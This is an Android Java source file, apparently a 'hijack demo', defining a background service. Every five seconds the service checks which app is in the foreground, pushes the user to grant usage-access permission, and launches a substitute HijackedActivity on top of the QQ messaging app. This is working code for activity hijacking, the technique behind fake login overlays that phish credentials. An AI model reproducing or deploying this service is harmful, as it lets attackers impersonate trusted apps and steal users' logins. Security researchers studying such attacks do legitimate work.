package com.gp.hijackdemo;

import android.annotation.TargetApi;
import android.app.ActivityManager;
import android.app.AppOpsManager;
import android.app.Service;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.IBinder;
import android.provider.Settings;
import android.util.Log;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.SortedMap;
import java.util.TimerTask;
import java.util.TreeMap;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ScheduledThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

public class HijackingService extends Service {

    private static final String TAG = HijackingService.class.getSimpleName();

    private ScheduledExecutorService Scheduleder = new ScheduledThreadPoolExecutor(2);

    HashMap<String, Class<?>> classStores = new HashMap<>();

    private String hijiackPackage = "com.tencent.mobileqq";

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        getInstalledApps(getApplication());
        classStores.put(hijiackPackage, HijackedActivity.class);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Scheduleder.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                String topApp;
                //判断是否有use 查看使用情况的权限
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    boolean useGranted = isUseGranted();
                    Log.e(TAG, "查看使用情况权限是否允许授权=" + useGranted);
                    if (useGranted) {
                        topApp = getHigherPackageName();
                        starthijack(topApp);
                    } else {
                        //开启应用授权界面
                        Intent intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
                        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        startActivity(intent);
                    }
                } else {
                    topApp = getLowerVersionPackageName0();
                    starthijack(topApp);
                }
            }
        }, 0, 5, TimeUnit.SECONDS);//每隔5s 执行一次
        return super.onStartCommand(intent, flags, startId);
    }

    private void starthijack(String packageName) {
        Log.e(TAG, "顶层app=" + packageName);
        Log.w(TAG, "定时劫持任务开始执行");
        if (!App.hasBeHijacked(packageName)){
            if (classStores.containsKey(packageName)){
                //已经劫持过应用添加到 App
//                App.addToHijacked(packageName);
                Intent jackingIntent = new Intent(getBaseContext(), classStores.get(packageName));
                jackingIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(jackingIntent);
            }
        }
    }

    //获取已安装的应用信息
    public ArrayList<HashMap<String, Object>> getInstalledApps(Context context) {
        PackageManager pckMan = context.getPackageManager();
        ArrayList<HashMap<String, Object>> items = new ArrayList<HashMap<String, Object>>();
        List<PackageInfo> packageInfo = pckMan.getInstalledPackages(0);
        for (PackageInfo pInfo : packageInfo) {
            HashMap<String, Object> item = new HashMap<String, Object>();
            Log.d(TAG, "------------start-----------------");
            item.put("appImage", pInfo.applicationInfo.loadIcon(pckMan));
            Log.d(TAG, "appimage-->"+pInfo.applicationInfo.loadIcon(pckMan));

            item.put("packageName", pInfo.packageName);
            Log.d(TAG, "packageName-->"+pInfo.packageName);

            item.put("versionCode", pInfo.versionCode);
            Log.d(TAG, "versionCode-->"+pInfo.versionCode);

            item.put("versionName", pInfo.versionName);
            Log.d(TAG, "versionName-->"+pInfo.versionName);

            item.put("appName", pInfo.applicationInfo.loadLabel(pckMan).toString());
            Log.d(TAG, "appName-->"+pInfo.applicationInfo.loadLabel(pckMan).toString());
            Log.d(TAG, "------------end-----------------");
            items.add(item);
        }
        return items;
    }

    /**
     * 是否有权查看使用情况
     * 该权限允许访问使用记录，允许应用跟踪用户正在使用的其他应用和使用频率，以及运营商、语言设置等。
     */
    @TargetApi(Build.VERSION_CODES.KITKAT)
    private boolean isUseGranted() {
        Context appContext = App.applicationContext;
        AppOpsManager appOps = (AppOpsManager) appContext.getSystemService(Context.APP_OPS_SERVICE);
        int mode = -1;
        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.LOLLIPOP) {
            mode = appOps.checkOpNoThrow("android:get_usage_stats", android.os.Process.myUid(), appContext.getPackageName());
        }
        boolean granted = mode == AppOpsManager.MODE_ALLOWED;
        return granted;
    }

    /**
     * 高版本：获取栈顶app的包名
     *
     * 利用UsageStatsManager，并且调用他的queryUsageStats方法来获得启动的历史记录，调用这个方法需要设置权限“Apps withusage access”。
     * 但是这个queryUsageStats只能查询一段时间内的使用状态，如果时间间隔较短，并且一段时间不使用手机，获得的列表就可能为空。
     */
    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
    private String getHigherPackageName() {
        String topPackageName = "";
        UsageStatsManager mUsageStatsManager = (UsageStatsManager) getSystemService(Context.USAGE_STATS_SERVICE);
        long time = System.currentTimeMillis();
        //time - 1000 * 1000, time 开始时间和结束时间的设置，在这个时间范围内 获取栈顶Activity 有效
        List<UsageStats> usageStats = mUsageStatsManager.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, time - 1000 * 1000, time);
        // Sort the usageStats by the last time used
        if (usageStats != null) {
            SortedMap<Long, UsageStats> mySortedMap = new TreeMap<Long, UsageStats>();
            for (UsageStats usage : usageStats) {
                mySortedMap.put(usage.getLastTimeUsed(), usage);
            }
            if (mySortedMap != null && !mySortedMap.isEmpty()) {
                topPackageName = mySortedMap.get(mySortedMap.lastKey()).getPackageName();
            }
        }
        return topPackageName;
    }

    /**
     * 低版本：获取栈顶app的包名
     * <=5.0用getRunningTasks()
     */
    private String getLowerVersionPackageName0() {
        String topPackageName;
        ActivityManager activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        ComponentName topActivity = activityManager.getRunningTasks(1).get(0).topActivity;
        topPackageName = topActivity.getPackageName();
        return topPackageName;
    }

    /**
     * <=5.0用getRunningAppProcesses()，否则only return the caller’s application process
     * @return
     */
    private Set<String> getLowerVersionPackageName1() {
        Set<String> activePackages= new HashSet<String>();

        ActivityManager activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        List<ActivityManager.RunningAppProcessInfo> processInfos = activityManager.getRunningAppProcesses();
        String currentApp = processInfos.get(0).processName;
        Log.i(TAG, currentApp + "在运行");

        for(ActivityManager.RunningAppProcessInfo processInfo : processInfos) {
            if (processInfo.importance ==ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND){
                activePackages.addAll(Arrays.asList(processInfo.pkgList));
                if (processInfo.processName.equals(hijiackPackage)) {
                    Log.i(TAG, hijiackPackage + "在运行");
                }
            }
        }
        return activePackages;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        App.clearHijacked();
    }

}
